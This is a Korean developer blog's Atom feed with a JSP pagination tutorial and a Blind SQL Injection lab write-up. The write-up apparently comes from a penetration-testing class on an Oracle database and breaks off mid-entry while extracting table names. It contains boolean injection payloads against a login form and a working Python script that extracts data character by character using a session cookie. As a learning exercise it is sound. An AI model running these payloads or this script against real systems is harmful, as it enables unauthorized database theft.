<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-16T00:34:37+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">웹 서버 개발 12 페이징 번호</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95/" rel="alternate" type="text/html" title="웹 서버 개발 12 페이징 번호" /><published>2023-05-16T00:00:00+09:00</published><updated>2023-05-16T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95/"><![CDATA[<h2 id="게시글-페이징-번호">게시글 페이징 번호</h2>
<ul>
  <li><a href="https://stackoverflow.com/search?page=29&amp;tab=Relevance&amp;pagesize=15&amp;q=jsp&amp;searchOn=3&amp;s=48d80aca-ac2a-486e-8868-d30aed82bf58">stackoverflow</a>의 페이징 스타일을 참고하였다.</li>
  <li>현재 페이지에 5개의 게시글을 보여준다.</li>
  <li>나중에 사용자가 한 페이지에 볼 수 있는 게시글 수를 정할수 있게 할 것이다.</li>
  <li>완성된 페이징 페이지.<br />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ff3b6285-554c-4496-a7bf-2e21de43a8e9" alt="Pasted image 20230515223925" /></li>
</ul>

<h3 id="jsp">JSP</h3>
<ul>
  <li>게시글의 베이스가 되는 jsp 파일을 수정하였다.</li>
</ul>

<h4 id="notice_boardjsp">notice_board.jsp</h4>
<ul>
  <li>servlet 으로 부터 현재 페이지와 마지막 페이지 정보를 받아온다.</li>
  <li>페이징 번호 리스트 정보를 받아온다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/a2b399311e658a135115829604a4721f.js"></script>

<p><br /></p>
<ul>
  <li>페이징 번호 리스트 정보를 이용하여 페이징 부분을 그려준다.</li>
  <li>리스트에 들어있는 0은 생략을 의미한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/3837b0845cb1383d7183418bfe310d75.js"></script>

<p><br /></p>

<ul>
  <li>총 게시글 수 보여주기.</li>
  <li>servlet 으로 부터 받은 총 게시글 수를 보여준다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/0d2bee07d5992c7a8f9d636392476f66.js"></script>

<p><br /></p>
<ul>
  <li>페이징 번호 스타일.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/c0c2034a0350abe4dba5f3b38e5d2b84.js"></script>

<p><br /></p>

<ul>
  <li>참고</li>
  <li>form 에서 input이 여러개면 엔터를 눌러도 submit 이 안된다.</li>
  <li>이럴 때는 type이 submit 인 input을 만들어 줘야한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/4733be6980bb83915c196cc75387d2bb.js"></script>

<p><br /></p>

<h3 id="servlet">Servlet</h3>

<h4 id="mainpagejava">MainPage.java</h4>

<ul>
  <li>uriSearch 함수의 게시판 부분이다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/90ed9ab083b6c47dac20bc5ac85a419d.js"></script>

<p><br /></p>
<ul>
  <li>현재 페이지 정보를 get의 파라미터로 받아온다.</li>
  <li>즉 <code class="language-plaintext highlighter-rouge">url?page=2&amp;q=검색</code> 형태이다.</li>
  <li>페이지 정보를 못 받아오거나 음수면 페이지를 1로 초기화를 진행한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/33f35d284dbcef6939581c769bc071dc.js"></script>

<p><br /></p>
<ul>
  <li>검색 결과에 해당하는 총 게시글의 수 구하기.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/319742435a0083c49288524bac837b50.js"></script>

<p><br /></p>
<ul>
  <li>한 페이지 보여줄 게시글의 수를 정한다.</li>
  <li>마지막 페이지를 구해준다.</li>
  <li>사용자로 부터 받은 페이지 수가 마지막 페이지 보다 크다면 마지막 페이지로 리다이렉트 한다.</li>
  <li>sql문으로 검색을 하기위해서 실제 데이터의 시작 위치를 계산하여 준다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/183a2b08e5bbe4c24e503059f1b57340.js"></script>

<p><br /></p>

<ul>
  <li>검색 데이터 가져오기.</li>
  <li>여기서는 5개의 게시글을 가져온다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/60563c690675f704572ed2b2fb53e86b.js"></script>

<p><br /></p>

<ul>
  <li>페이징 번호를 저장하기 위한 리스트를 만들어준다.</li>
  <li>한번에 몇개의 페이징번호를 보여줄지 정해준다.</li>
  <li>해당 리스트에 0은 생략을 의미한다.</li>
  <li>예를들어 현재 페이지가 <code class="language-plaintext highlighter-rouge">6</code>이고 마지막 페이지가 <code class="language-plaintext highlighter-rouge">10</code> 이면 페이징 형태가 다음과 같다.  <br /><code class="language-plaintext highlighter-rouge">1 ... 4 5 6 7 8 ... 10</code></li>
</ul>

<script src="https://gist.github.com/MinGyu2/55e88f3c9e0541a01bf2e5f7e3fe016b.js"></script>

<p><br /></p>

<ul>
  <li>페이지를 그리기위하여 <code class="language-plaintext highlighter-rouge">mainpage jsp</code>로 지금까지 만들었던 정보를 넘겨준다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/ff414408dd9e1e1f57987724682add56.js"></script>

<p><br /></p>

<h4 id="noticeboarddaojava">NoticeBoardDAO.java</h4>

<ul>
  <li>검색목록을 가져오는 getNoticeList 함수를 수정하였다.</li>
  <li>모든 목록을 가져오는 것이아닌 정해준 갯수의 게시물 목록만 가지고 온다.</li>
  <li>게시글의 시작위치와 가져올 갯수를 함수의 인자로 준다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/64410a9c64396ddadf7daae2e395c527.js"></script>

<p><br /></p>
<ul>
  <li>sql 쿼리문에 특정 갯수만 출력을 하기위한 구문을 추가한다.</li>
  <li><code class="language-plaintext highlighter-rouge">prepared statment</code>를 이용하였다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/4becbc45b945e4751efaed31724bcf75.js"></script>

<p><br /></p>

<ul>
  <li>검색된 게시판 목록 총 개수 구하기.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/a81e9332c5ece965cee636428604b360.js"></script>

<h3 id="전체코드">전체코드</h3>

<h4 id="mainpagejava-1">MainPage.java</h4>
<script src="https://gist.github.com/MinGyu2/95dee19807c4b09f512b2584b0f3e224.js"></script>

<h4 id="noticeboarddaojava-1">NoticeBoardDAO.java</h4>
<script src="https://gist.github.com/MinGyu2/a0071a20f1b991dadccc9e8c307a1ab4.js"></script>

<script src="https://gist.github.com/MinGyu2/7e955cecf219df3a91a6012bb3fbf428.js"></script>

<h4 id="notice_boardjsp-1">notice_board.jsp</h4>
<script src="https://gist.github.com/MinGyu2/7e955cecf219df3a91a6012bb3fbf428.js"></script>

<h3 id="웹-프로젝트">웹 프로젝트</h3>
<ul>
  <li><a href="https://github.com/MinGyu2/MyHomePage">MinGyu2/MyHomePage (github.com)</a></li>
  <li><a href="https://github.com/MinGyu2/myWeb">MinGyu2/myWeb (github.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="jsp" /><category term="servlet" /><summary type="html"><![CDATA[게시글에 페이징 번호를 추가하자.]]></summary></entry><entry><title type="html">Blind SQL Injection 실습</title><link href="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/" rel="alternate" type="text/html" title="Blind SQL Injection 실습" /><published>2023-05-12T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5</id><content type="html" xml:base="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/"><![CDATA[<h2 id="실습-환경">실습 환경</h2>
<ul>
  <li>오라클 DB</li>
</ul>

<h2 id="서버-인증-질의문-예측하기">서버 인증 질의문 예측하기</h2>

<ul>
  <li>인증과 식별을 따로 분리하여 검사한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">id</span><span class="p">,</span><span class="n">pwd</span> <span class="k">from</span> <span class="n">xxx</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'xx'</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="참과-거짓-화면">참과 거짓 화면</h2>
<ul>
  <li>로그인 성공 실패 여부로 참과 거짓을 구분할 수 있다.</li>
</ul>

<h3 id="참">참</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<ul>
  <li>로그인 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/57c7f54d-5fef-454e-9060-047ac800766a" alt="Pasted image 20230511135315" /></li>
</ul>

<h3 id="거짓">거짓</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<ul>
  <li>로그인 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/310a130f-2f28-444b-b75d-3692cc977cfd" alt="Pasted image 20230511135242" /></li>
</ul>

<h2 id="select-문-사용-가능-확인">select 문 사용 가능 확인</h2>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="s1">'test'</span><span class="p">)</span><span class="o">=</span><span class="s1">'test'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span>
<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">)</span><span class="o">=</span><span class="s1">'test'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>
</code></pre></div></div>

<ul>
  <li>로그인 성공. select 문을 사용할 수 있다.</li>
</ul>

<h2 id="공격-포맷-만들기">공격 포맷 만들기.</h2>
<ul>
  <li>Blind SQL Injection 은 한 문자씩 확인하는 공격이다.</li>
  <li>ascii 와 substr 함수를 이용할 것 이다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="s1">'t'</span><span class="p">)</span><span class="o">=</span><span class="s1">'t'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="n">ascii</span> <span class="err">함수를</span> <span class="err">문자를</span> <span class="err">이용하여</span> <span class="err">아스키코드로</span> <span class="err">변환한다</span><span class="p">.</span>
<span class="n">ascii</span><span class="p">(</span><span class="s1">'t'</span><span class="p">)</span>
<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="s1">'t'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="s1">'t'</span> <span class="err">한</span> <span class="err">문자</span> <span class="err">추출하기</span><span class="p">.</span>
<span class="n">substr</span><span class="p">(</span><span class="s1">'test'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="s1">'test'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="err">공격문</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">SQL</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>

<span class="s1">'test'</span> <span class="err">출력하기</span><span class="p">.</span>
<span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
<span class="err">공격문</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>
</code></pre></div></div>

<ul>
  <li>완성된 공격 포맷</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">SQL</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<h2 id="base가-되는-파이썬-코드">Base가 되는 파이썬 코드</h2>
<ul>
  <li>인자로 쿼리문을 삽입해 주면 된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FAIL_LEN</span> <span class="o">=</span> <span class="mi">1482</span><span class="p">;</span>
<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://221.27.0.6/main_page/sql_injection_prob/login_methods/division_blind_sql_injection/authentication"</span>
<span class="n">COOKIES</span> <span class="o">=</span> <span class="p">{</span><span class="s">'JSESSIONID'</span><span class="p">:</span><span class="s">'E092AC001C0A642C200BD6902B7EF6A5'</span><span class="p">}</span>
<span class="n">DATA</span><span class="o">=</span><span class="p">{</span><span class="s">'user_name'</span><span class="p">:</span><span class="s">'user2'</span><span class="p">,</span> <span class="s">'user_password'</span><span class="p">:</span><span class="s">'2222'</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">is_success</span><span class="p">()</span><span class="o">-&gt;</span><span class="nb">bool</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">URL</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span> <span class="n">COOKIES</span><span class="p">,</span><span class="n">data</span><span class="o">=</span> <span class="n">DATA</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="nf">len</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="o">!=</span> <span class="n">FAIL_LEN</span><span class="p">;</span>
  
<span class="k">def</span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">row</span> <span class="o">=</span> <span class="mi">0</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">is_success</span><span class="p">()</span> <span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">point</span> <span class="o">=</span> <span class="mi">1</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="n">point</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">is_success</span><span class="p">():</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1"># 이분 탐색
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">s</span> <span class="o">=</span> <span class="mi">32</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="mi">126</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="n">e</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="n">e</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="n">point</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="nf">is_success</span><span class="p">()</span> <span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">s</span> <span class="o">=</span> <span class="n">m</span><span class="o">+</span><span class="mi">1</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">else</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="n">m</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span><span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">point</span> <span class="o">+=</span><span class="mi">1</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">()</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">row</span><span class="o">+=</span><span class="mi">1</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
<span class="c1"># sql 질의문
# row 0 부터 시작
# point 1 부터 시작
# ascii
</span><span class="k">def</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">row</span><span class="p">,</span> <span class="n">point</span><span class="p">,</span> <span class="nb">ascii</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span> <span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">attack_query</span> <span class="o">=</span> <span class="p">(</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">"user2' and ((ascii(substr(("</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">sql</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">" OFFSET "</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="n">row</span><span class="p">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">" ROWS FETCH NEXT 1 ROWS ONLY),"</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="n">point</span><span class="p">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">",1)))&gt;"</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">str</span><span class="p">(</span><span class="nb">ascii</span><span class="p">),</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s">") and '1'='1"</span>
<span class="err"> </span> <span class="err"> </span> <span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">attack_query</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="사용자-명-추출-하기">사용자 명 추출 하기.</h2>
<ul>
  <li>현재 사용중인 사용자 명을 출력한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">user</span> <span class="k">from</span> <span class="n">dual</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
<span class="err">성공</span>

<span class="err">한</span> <span class="err">문자씩</span> <span class="err">찾아주면</span> <span class="err">된다</span><span class="p">.</span>
</code></pre></div></div>

<ul>
  <li>파이썬 코드로 빠르게 사용자 명 찾기.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_current_user_name</span><span class="p">():</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select user from dual"</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="o">=</span> <span class="n">query</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
</code></pre></div></div>

<ul>
  <li>추출한 데이터.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C##DBFORPROB
</code></pre></div></div>

<h2 id="테이블-명-추출하기">테이블 명 추출하기.</h2>
<ul>
  <li>현재 존재하는 테이블 명들을 추출해 보자.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">all_tables</span> <span class="k">where</span> <span class="k">owner</span><span class="o">=</span><span class="s1">'C##DBFORPROB'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
<span class="err">또는</span> 
<span class="k">select</span> <span class="n">tname</span> <span class="k">from</span> <span class="n">tab</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>

